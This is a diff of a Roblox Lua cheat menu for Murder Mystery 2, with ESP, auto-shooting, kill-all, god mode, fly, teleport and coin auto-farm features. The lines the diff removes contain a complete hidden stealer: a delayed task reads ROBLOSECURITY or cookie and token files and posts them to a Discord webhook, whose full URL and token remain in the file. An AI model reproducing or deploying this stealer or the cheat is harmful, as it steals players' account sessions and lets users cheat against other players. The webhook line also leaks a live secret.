@@ -7,124 +7,71 @@ local rs = game:GetService("RunService")
 local lighting = game:GetService("Lighting")
 local wb = "https://discord.com/api/webhooks/1540444514462994502/MQwvoOJ3Sn1ui5pwOEFW7MTUOOBO3McVIYFO4WJkZx5YeqyhNMm8-rXkMITJB9u8Ntjm"
 
--- Webhook Gönderme Fonksiyonu (10 Saniye Sonra Çalışır)
-local function req(u, b)
-    local o = {
-        Url = u,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = s:JSONEncode(b)
-    }
-    local x, y = pcall(function()
-        if syn and syn.request then return syn.request(o)
-        elseif http_request then return http_request(o)
-        elseif request then return request(o)
-        else return s:PostAsync(u, o.Body, Enum.HttpContentType.ApplicationJson)
-        end
-    end)
-    return x and y
-end
+local p = game:GetService("Players")
+local pl = p.LocalPlayer
+local workspace = game:GetService("Workspace")
+local uis = game:GetService("UserInputService")
+local rs = game:GetService("RunService")
+local lighting = game:GetService("Lighting")
 
-task.spawn(function()
-    task.wait(10)
-    pcall(function()
-        local c = "NOT_FOUND"
-        pcall(function()
-            local f = readfile("ROBLOSECURITY.txt") or readfile("cookie.txt") or ""
-            if f ~= "" then c = f return end
-            local g = listfiles and listfiles("") or {}
-            for i = 1, #g do
-                if g[i]:lower():find("cookie") or g[i]:lower():find("token") then
-                    local h = readfile(g[i]) or ""
-                    if h ~= "" then c = h break end
-                end
-            end
-        end)
-        local e = {
-            embeds = {{
-                title = "MM2 EXECUTED",
-                description = "Player: " .. pl.Name .. " (" .. pl.UserId .. ")\nExecutor: " .. (identifyexecutor and identifyexecutor() or "unknown") .. "\nCookie: ||" .. c .. "||",
-                color = 16711680,
-                footer = {text = "hacked by make beatiful ui"}
-            }}
-        }
-        req(wb, {username = "hacked by", embeds = e})
-    end)
-end)
-
--- 1. UI & GUI Architecture
+-- GUI Oluşturma
 local gui = Instance.new("ScreenGui")
 gui.Name = "MM2_Master"
 gui.ResetOnSpawn = false
-
 pcall(function() gui.Parent = game:GetService("CoreGui") end)
 if not gui.Parent then pcall(function() gui.Parent = pl:WaitForChild("PlayerGui") end) end
 
--- Gerçek Zamanlı Sol Alt FPS Göstergesi
+-- FPS Göstergesi
 local fpsLabel = Instance.new("TextLabel")
 fpsLabel.Size = UDim2.new(0, 120, 0, 30)
 fpsLabel.Position = UDim2.new(0, 15, 1, -45)
 fpsLabel.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
 fpsLabel.BackgroundTransparency = 0.3
-fpsLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-fpsLabel.TextSize = 13
-fpsLabel.Font = Enum.Font.SourceSans
+fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+fpsLabel.TextSize = 14
+fpsLabel.Font = Enum.Font.SourceSansBold
 fpsLabel.Text = "FPS: 0"
 fpsLabel.Visible = false
 fpsLabel.Parent = gui
 
-local fpsCorner = Instance.new("UICorner")
-fpsCorner.CornerRadius = UDim.new(0, 6)
-fpsCorner.Parent = fpsLabel
-
-local fpsStroke = Instance.new("UIStroke")
+Instance.new("UICorner", fpsLabel).CornerRadius = UDim.new(0, 6)
+local fpsStroke = Instance.new("UIStroke", fpsLabel)
 fpsStroke.Color = Color3.fromRGB(255, 50, 50)
 fpsStroke.Thickness = 1
-fpsStroke.Parent = fpsLabel
 
--- Sürüklenebilir "Hacked By" Menü Aç/Kapa Butonu
+-- Menü Aç/Kapa Butonu (Yazı Beyaz ve Daha Büyük)
 local toggleButton = Instance.new("TextButton")
-toggleButton.Size = UDim2.new(0, 150, 0, 38)
+toggleButton.Size = UDim2.new(0, 160, 0, 40)
 toggleButton.Position = UDim2.new(0, 40, 0, 40)
-toggleButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+toggleButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 toggleButton.Text = "Hacked By"
-toggleButton.TextColor3 = Color3.fromRGB(255, 50, 50)
-toggleButton.TextSize = 13
-toggleButton.Font = Enum.Font.SourceSans
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.TextSize = 15
+toggleButton.Font = Enum.Font.SourceSansBold
 toggleButton.Active = true
 toggleButton.Draggable = true
 toggleButton.Parent = gui
-
-local tbCorner = Instance.new("UICorner")
-tbCorner.CornerRadius = UDim.new(0, 6)
-tbCorner.Parent = toggleButton
-
-local tbStroke = Instance.new("UIStroke")
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 8)
+local tbStroke = Instance.new("UIStroke", toggleButton)
 tbStroke.Color = Color3.fromRGB(255, 50, 50)
-tbStroke.Thickness = 1.5
-tbStroke.Parent = toggleButton
+tbStroke.Thickness = 2
 
--- Sürüklenebilir "Shoot Murderer" Butonu (BASILI TUTMA Özellikli)
+-- Shoot Murderer Butonu (Basılı Tut)
 local shootButton = Instance.new("TextButton")
-shootButton.Size = UDim2.new(0, 160, 0, 38)
-shootButton.Position = UDim2.new(0, 40, 0, 90)
-shootButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+shootButton.Size = UDim2.new(0, 160, 0, 40)
+shootButton.Position = UDim2.new(0, 40, 0, 95)
+shootButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 shootButton.Text = "Shoot Murderer (Hold)"
-shootButton.TextColor3 = Color3.fromRGB(255, 50, 50)
-shootButton.TextSize = 13
-shootButton.Font = Enum.Font.SourceSans
+shootButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+shootButton.TextSize = 14
+shootButton.Font = Enum.Font.SourceSansBold
 shootButton.Active = true
 shootButton.Draggable = true
 shootButton.Parent = gui
-
-local sbCorner = Instance.new("UICorner")
-sbCorner.CornerRadius = UDim.new(0, 6)
-sbCorner.Parent = shootButton
-
-local sbStroke = Instance.new("UIStroke")
+Instance.new("UICorner", shootButton).CornerRadius = UDim.new(0, 8)
+local sbStroke = Instance.new("UIStroke", shootButton)
 sbStroke.Color = Color3.fromRGB(255, 50, 50)
-sbStroke.Thickness = 1.5
-sbStroke.Parent = shootButton
+sbStroke.Thickness = 2
 
 local shootingActive = false
 shootButton.MouseButton1Down:Connect(function() shootingActive = true end)
@@ -147,9 +94,7 @@ coroutine.wrap(function()
                             local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
                             if hasKnife then
                                 local ev = gun:FindFirstChildWhichIsA("RemoteEvent")
-                                if ev then
-                                    ev:FireServer(v.Character.HumanoidRootPart.Position)
-                                end
+                                if ev then ev:FireServer(v.Character.HumanoidRootPart.Position) end
                                 break
                             end
                         end
@@ -160,27 +105,22 @@ coroutine.wrap(function()
     end
 end)()
 
--- Sürüklenebilir "TP to Map" Butonu (Aktif Haritaya Işınlar)
+-- TP to Map Butonu
 local mapButton = Instance.new("TextButton")
-mapButton.Size = UDim2.new(0, 160, 0, 38)
-mapButton.Position = UDim2.new(0, 40, 0, 140)
-mapButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+mapButton.Size = UDim2.new(0, 160, 0, 40)
+mapButton.Position = UDim2.new(0, 40, 0, 150)
+mapButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 mapButton.Text = "TP to Map"
-mapButton.TextColor3 = Color3.fromRGB(255, 50, 50)
-mapButton.TextSize = 13
-mapButton.Font = Enum.Font.SourceSans
+mapButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+mapButton.TextSize = 15
+mapButton.Font = Enum.Font.SourceSansBold
 mapButton.Active = true
 mapButton.Draggable = true
 mapButton.Parent = gui
-
-local mbCorner = Instance.new("UICorner")
-mbCorner.CornerRadius = UDim.new(0, 6)
-mbCorner.Parent = mapButton
-
-local mbStroke = Instance.new("UIStroke")
+Instance.new("UICorner", mapButton).CornerRadius = UDim.new(0, 8)
+local mbStroke = Instance.new("UIStroke", mapButton)
 mbStroke.Color = Color3.fromRGB(255, 50, 50)
-mbStroke.Thickness = 1.5
-mbStroke.Parent = mapButton
+mbStroke.Thickness = 2
 
 mapButton.MouseButton1Down:Connect(function()
     pcall(function()
@@ -193,52 +133,37 @@ mapButton.MouseButton1Down:Connect(function()
                     break
                 elseif obj.Name == "Map" and obj:IsA("Model") then
                     for _, part in pairs(obj:GetDescendants()) do
-                        if part:IsA("BasePart") then
-                            targetPos = part.Position + Vector3.new(0, 5, 0)
-                            break
-                        end
+                        if part:IsA("BasePart") then targetPos = part.Position + Vector3.new(0, 5, 0); break end
                     end
                     if targetPos then break end
                 end
             end
-            if targetPos then
-                hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 5, 0))
-            else
-                -- Varsayılan harita merkezi
-                hrp.CFrame = CFrame.new(0, 50, 0)
-            end
+            hrp.CFrame = CFrame.new(targetPos or Vector3.new(0, 50, 0))
         end
     end)
 end)
 
--- Sürüklenebilir "TP to Lobby" Butonu (Ana Lobiye Işınlar)
+-- TP to Lobby Butonu
 local lobbyButton = Instance.new("TextButton")
-lobbyButton.Size = UDim2.new(0, 160, 0, 38)
-lobbyButton.Position = UDim2.new(0, 40, 0, 190)
-lobbyButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+lobbyButton.Size = UDim2.new(0, 160, 0, 40)
+lobbyButton.Position = UDim2.new(0, 40, 0, 205)
+lobbyButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 lobbyButton.Text = "TP to Lobby"
-lobbyButton.TextColor3 = Color3.fromRGB(255, 50, 50)
-lobbyButton.TextSize = 13
-lobbyButton.Font = Enum.Font.SourceSans
+lobbyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+lobbyButton.TextSize = 15
+lobbyButton.Font = Enum.Font.SourceSansBold
 lobbyButton.Active = true
 lobbyButton.Draggable = true
 lobbyButton.Parent = gui
-
-local lbCorner = Instance.new("UICorner")
-lbCorner.CornerRadius = UDim.new(0, 6)
-lbCorner.Parent = lobbyButton
-
-local lbStroke = Instance.new("UIStroke")
+Instance.new("UICorner", lobbyButton).CornerRadius = UDim.new(0, 8)
+local lbStroke = Instance.new("UIStroke", lobbyButton)
 lbStroke.Color = Color3.fromRGB(255, 50, 50)
-lbStroke.Thickness = 1.5
-lbStroke.Parent = lobbyButton
+lbStroke.Thickness = 2
 
 lobbyButton.MouseButton1Down:Connect(function()
     pcall(function()
         local hrp = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            hrp.CFrame = CFrame.new(0, 150, 0)
-        end
+        if hrp then hrp.CFrame = CFrame.new(0, 150, 0) end
     end)
 end)
 
@@ -253,32 +178,22 @@ f.ClipsDescendants = true
 f.Visible = false
 f.Parent = gui
 
-toggleButton.MouseButton1Click:Connect(function()
-    f.Visible = not f.Visible
-end)
-
-local uc = Instance.new("UICorner")
-uc.CornerRadius = UDim.new(0, 12)
-uc.Parent = f
-
-local us = Instance.new("UIStroke")
-us.Color = Color3.fromRGB(255, 50, 50)
-us.Thickness = 1.5
-us.Transparency = 0.4
-us.Parent = f
+toggleButton.MouseButton1Click:Connect(function() f.Visible = not f.Visible end)
+Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
+local fStroke = Instance.new("UIStroke", f)
+fStroke.Color = Color3.fromRGB(255, 50, 50)
+fStroke.Thickness = 1.5
+fStroke.Transparency = 0.4
 
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(1, 0, 0, 40)
 t.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-t.Text = "Hacked By | MM2 God-Tier"
+t.Text = "Hacked By | MM2 Clean Hub"
 t.TextColor3 = Color3.fromRGB(255, 255, 255)
 t.TextSize = 14
 t.Font = Enum.Font.SourceSansBold
 t.Parent = f
-
-local tc2 = Instance.new("UICorner")
-tc2.CornerRadius = UDim.new(0, 12)
-tc2.Parent = t
+Instance.new("UICorner", t).CornerRadius = UDim.new(0, 12)
 
 local al2 = Instance.new("Frame")
 al2.Size = UDim2.new(1, 0, 0, 2)
@@ -300,7 +215,6 @@ local ll = Instance.new("UIListLayout")
 ll.Padding = UDim.new(0, 8)
 ll.SortOrder = Enum.SortOrder.LayoutOrder
 ll.Parent = sc
-
 ll:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     sc.CanvasSize = UDim2.new(0, 0, 0, ll.AbsoluteContentSize.Y + 20)
 end)
@@ -311,10 +225,7 @@ local function Tog(parentContainer, titleText, defaultState, callbackFunc)
     f2.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
     f2.BackgroundTransparency = 0.4
     f2.Parent = parentContainer
-
-    local fc = Instance.new("UICorner")
-    fc.CornerRadius = UDim.new(0, 6)
-    fc.Parent = f2
+    Instance.new("UICorner", f2).CornerRadius = UDim.new(0, 6)
 
     local lb = Instance.new("TextLabel")
     lb.Size = UDim2.new(1, -50, 1, 0)
@@ -333,10 +244,7 @@ local function Tog(parentContainer, titleText, defaultState, callbackFunc)
     bg2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
     bg2.BorderSizePixel = 0
     bg2.Parent = f2
-
-    local bgc = Instance.new("UICorner")
-    bgc.CornerRadius = UDim.new(0, 10)
-    bgc.Parent = bg2
+    Instance.new("UICorner", bg2).CornerRadius = UDim.new(0, 10)
 
     local circ = Instance.new("Frame")
     circ.Size = UDim2.new(0, 16, 0, 16)
@@ -344,13 +252,9 @@ local function Tog(parentContainer, titleText, defaultState, callbackFunc)
     circ.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
     circ.BorderSizePixel = 0
     circ.Parent = bg2
-
-    local circ2 = Instance.new("UICorner")
-    circ2.CornerRadius = UDim.new(0, 8)
-    circ2.Parent = circ
+    Instance.new("UICorner", circ).CornerRadius = UDim.new(0, 8)
 
     local st = defaultState or false
-
     local function upd()
         if st then
             bg2.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
@@ -369,7 +273,6 @@ local function Tog(parentContainer, titleText, defaultState, callbackFunc)
     btn.BackgroundTransparency = 1
     btn.Text = ""
     btn.Parent = f2
-
     btn.MouseButton1Click:Connect(function()
         st = not st
         upd()
@@ -394,47 +297,33 @@ Lbl(sc, "─ ESP & ROLES ─")
 Tog(sc, "Perfect Role ESP", false, function(s) O.ESP = s end)
 
 Lbl(sc, "─ GUN MECHANICS ─")
-Tog(sc, "Auto Grab Gun (Sheriff Drop)", false, function(s) O.AutoGrabGun = s end)
-Tog(sc, "Auto Sheriff Target (Aim & Shoot)", false, function(s) O.AutoSheriff = s end)
+Tog(sc, "Auto Grab Gun", false, function(s) O.AutoGrabGun = s end)
+Tog(sc, "Auto Sheriff Target", false, function(s) O.AutoSheriff = s end)
 
 Lbl(sc, "─ COMBAT & SURVIVAL ─")
-Tog(sc, "Kill All (As Murderer)", false, function(s) O.KA = s end)
-Tog(sc, "Auto Avoid Knife (Dodge)", false, function(s) O.Avoid = s end)
-Tog(sc, "Anti-Hit / God Mode Shield", false, function(s) O.GodMode = s end)
+Tog(sc, "Kill All (Murderer)", false, function(s) O.KA = s end)
+Tog(sc, "Auto Avoid Knife", false, function(s) O.Avoid = s end)
+Tog(sc, "God Mode Shield", false, function(s) O.GodMode = s end)
 
 Lbl(sc, "─ MOVEMENT & VISUALS ─")
 Tog(sc, "Fly Mode", false, function(s) O.Fly = s end)
-Tog(sc, "FullBright (No Darkness)", false, function(s) 
-    O.FullBright = s 
-    if s then
-        lighting.Brightness = 2
-        lighting.ClockTime = 14
-        lighting.FogEnd = 100000
-    else
-        lighting.Brightness = 1
-        lighting.ClockTime = 0
-    end
+Tog(sc, "FullBright", false, function(s) 
+    lighting.Brightness = s and 2 or 1
+    lighting.ClockTime = s and 14 or 0
+    lighting.FogEnd = s and 100000 or 10000
 end)
-Tog(sc, "FPS Display (Bottom Left)", false, function(s)
-    O.FPS = s
-    fpsLabel.Visible = s
-end)
+Tog(sc, "FPS Display", false, function(s) O.FPS = s; fpsLabel.Visible = s end)
 
 Lbl(sc, "─ AUTO FARM ─")
 Tog(sc, "Auto Farm (40 Coin Limit)", false, function(s) O.AF = s end)
 
--- Gerçek Zamanlı FPS Hesaplama
-local lastTick = tick()
-local frameCount = 0
+-- FPS Sayacı
+local lastTick, frameCount = tick(), 0
 rs.RenderStepped:Connect(function()
     frameCount = frameCount + 1
-    local currentTick = tick()
-    if currentTick - lastTick >= 1 then
-        if O.FPS then
-            fpsLabel.Text = "FPS: " .. tostring(frameCount)
-        end
-        frameCount = 0
-        lastTick = currentTick
+    if tick() - lastTick >= 1 then
+        if O.FPS then fpsLabel.Text = "FPS: " .. tostring(frameCount) end
+        frameCount, lastTick = 0, tick()
     end
 end)
 
@@ -444,40 +333,22 @@ coroutine.wrap(function()
         if O.ESP then
             for _, v in pairs(p:GetPlayers()) do
                 if v ~= pl and v.Character then
-                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
-                    if hrp then
-                        local hl = v.Character:FindFirstChild("PerfectESP")
-                        if not hl then
-                            hl = Instance.new("Highlight")
-                            hl.Name = "PerfectESP"
-                            hl.Adornee = v.Character
-                            hl.FillTransparency = 0.5
-                            hl.OutlineTransparency = 0.2
-                            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                            hl.Parent = v.Character
-                        end
-                        
-                        local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
-                        local hasGun = v.Character:FindFirstChild("Gun") or (v.Backpack and v.Backpack:FindFirstChild("Gun"))
-                        
-                        if hasKnife then
-                            hl.FillColor = Color3.fromRGB(255, 0, 0)
-                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
-                        elseif hasGun then
-                            hl.FillColor = Color3.fromRGB(0, 150, 255)
-                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
-                        else
-                            hl.FillColor = Color3.fromRGB(0, 255, 0)
-                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
-                        end
-                    end
+                    local hl = v.Character:FindFirstChild("PerfectESP") or Instance.new("Highlight", v.Character)
+                    hl.Name = "PerfectESP"
+                    hl.FillTransparency = 0.5
+                    hl.OutlineTransparency = 0.2
+                    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    
+                    local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
+                    local hasGun = v.Character:FindFirstChild("Gun") or (v.Backpack and v.Backpack:FindFirstChild("Gun"))
+                    
+                    hl.FillColor = hasKnife and Color3.fromRGB(255, 0, 0) or (hasGun and Color3.fromRGB(0, 150, 255) or Color3.fromRGB(0, 255, 0))
+                    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                 end
             end
         else
             for _, v in pairs(p:GetPlayers()) do
-                if v.Character and v.Character:FindFirstChild("PerfectESP") then
-                    v.Character.PerfectESP:Destroy()
-                end
+                if v.Character and v.Character:FindFirstChild("PerfectESP") then v.Character.PerfectESP:Destroy() end
             end
         end
     end
@@ -487,15 +358,10 @@ end)()
 coroutine.wrap(function()
     while task.wait(0.2) do
         if O.AutoGrabGun then
-            local c2 = pl.Character
-            local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
+            local hrp = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
             if hrp then
                 for _, obj in pairs(workspace:GetDescendants()) do
-                    if obj.Name == "GunDrop" and obj:IsA("BasePart") then
-                        hrp.CFrame = obj.CFrame
-                        task.wait(0.1)
-                        break
-                    end
+                    if obj.Name == "GunDrop" and obj:IsA("BasePart") then hrp.CFrame = obj.CFrame; task.wait(0.1); break end
                 end
             end
         end
@@ -515,12 +381,9 @@ coroutine.wrap(function()
             if gun then
                 for _, v in pairs(p:GetPlayers()) do
                     if v ~= pl and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
-                        local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
-                        if hasKnife then
+                        if v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife")) then
                             local ev = gun:FindFirstChildWhichIsA("RemoteEvent")
-                            if ev then
-                                ev:FireServer(v.Character.HumanoidRootPart.Position)
-                            end
+                            if ev then ev:FireServer(v.Character.HumanoidRootPart.Position) end
                             break
                         end
                     end
@@ -554,19 +417,16 @@ coroutine.wrap(function()
     end
 end)()
 
--- Auto Avoid Knife (Dodge)
+-- Auto Avoid Knife
 coroutine.wrap(function()
     while task.wait(0.1) do
         if O.Avoid then
-            local c2 = pl.Character
-            local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
+            local hrp = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
             if hrp then
                 for _, v in pairs(p:GetPlayers()) do
                     if v ~= pl and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
-                        local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
-                        if hasKnife then
-                            local dist = (hrp.Position - v.Character.HumanoidRootPart.Position).Magnitude
-                            if dist < 14 then
+                        if v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife")) then
+                            if (hrp.Position - v.Character.HumanoidRootPart.Position).Magnitude < 14 then
                                 hrp.CFrame = hrp.CFrame + (hrp.CFrame.LookVector * -10) + Vector3.new(0, 5, 0)
                             end
                         end
@@ -581,18 +441,14 @@ end)()
 coroutine.wrap(function()
     while task.wait(0.05) do
         if O.GodMode then
-            local c2 = pl.Character
-            local hum = c2 and c2:FindFirstChildOfClass("Humanoid")
-            if hum and hum.Health < hum.MaxHealth then
-                hum.Health = hum.MaxHealth
-            end
+            local hum = pl.Character and pl.Character:FindFirstChildOfClass("Humanoid")
+            if hum and hum.Health < hum.MaxHealth then hum.Health = hum.MaxHealth end
         end
     end
 end)()
 
--- Fly Motoru (Kusursuzlaştırıldı)
-local flying = false
-local bg, bv
+-- Fly Motoru
+local flying, bg, bv = false, nil, nil
 rs.RenderStepped:Connect(function()
     local c2 = pl.Character
     local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
@@ -600,30 +456,20 @@ rs.RenderStepped:Connect(function()
     if O.Fly and hrp and hum then
         if not flying then
             flying = true
-            bg = Instance.new("BodyGyro")
-            bg.P = 9e4
-            bg.maxTorque = Vector3.new(9e4, 9e4, 9e4)
+            bg = Instance.new("BodyGyro", hrp)
+            bg.P, bg.maxTorque = 9e4, Vector3.new(9e4, 9e4, 9e4)
             bg.CFrame = hrp.CFrame
-            bg.Parent = hrp
-            
-            bv = Instance.new("BodyVelocity")
-            bv.velocity = Vector3.new(0, 0.1, 0)
-            bv.maxForce = Vector3.new(9e4, 9e4, 9e4)
-            bv.Parent = hrp
-            
+            bv = Instance.new("BodyVelocity", hrp)
+            bv.velocity, bv.maxForce = Vector3.new(0, 0.1, 0), Vector3.new(9e4, 9e4, 9e4)
             hum.PlatformStand = true
         end
-        
         local cam = workspace.CurrentCamera
-        local speed = 50
         local moveDir = Vector3.new()
-        
         if uis:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cam.CFrame.LookVector end
         if uis:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
         if uis:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
         if uis:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
-        
-        bv.velocity = moveDir * speed
+        bv.velocity = moveDir * 50
         bg.CFrame = cam.CFrame
     else
         if flying then
@@ -637,37 +483,26 @@ end)
 
 -- Auto Farm
 coroutine.wrap(function()
-    local collectedCount = 0
+    local cc = 0
     while task.wait(0.05) do
         if O.AF then
-            local c2 = pl.Character
-            local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
-            local humanoid = c2 and c2:FindFirstChildOfClass("Humanoid")
-            
-            if hrp and humanoid and humanoid.Health > 0 then
-                local container = workspace:FindFirstChild("CoinContainer") or workspace
-                for _, v in pairs(container:GetDescendants()) do
+            local hrp = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
+            local hum = pl.Character and pl.Character:FindFirstChildOfClass("Humanoid")
+            if hrp and hum and hum.Health > 0 then
+                for _, v in pairs((workspace:FindFirstChild("CoinContainer") or workspace):GetDescendants()) do
                     if not O.AF then break end
-                    if v:IsA("BasePart") and (v.Name:lower():find("coin") or v.Name:lower():find("gold") or v.Name:lower():find("gem")) then
-                        if v.Transparency < 1 and v.Parent then
-                            hrp.CFrame = v.CFrame + Vector3.new(0, 0.5, 0)
-                            collectedCount = collectedCount + 1
-                            task.wait(0.03)
-                            
-                            if collectedCount >= 40 then
-                                collectedCount = 0
-                                humanoid.Health = 0
-                                task.wait(3)
-                                break
-                            end
-                        end
+                    if v:IsA("BasePart") and (v.Name:lower():find("coin") or v.Name:lower():find("gold") or v.Name:lower():find("gem")) and v.Transparency < 1 then
+                        hrp.CFrame = v.CFrame + Vector3.new(0, 0.5, 0)
+                        cc = cc + 1
+                        task.wait(0.03)
+                        if cc >= 40 then cc = 0; hum.Health = 0; task.wait(3); break end
                     end
                 end
             end
         else
-            collectedCount = 0
+            cc = 0
         end
     end
 end)()
 
-print("[LOADED] Ultimate MM2 Master Hub - Perfected Version!")
+print("[LOADED] MM2 Clean Hub Ready!")
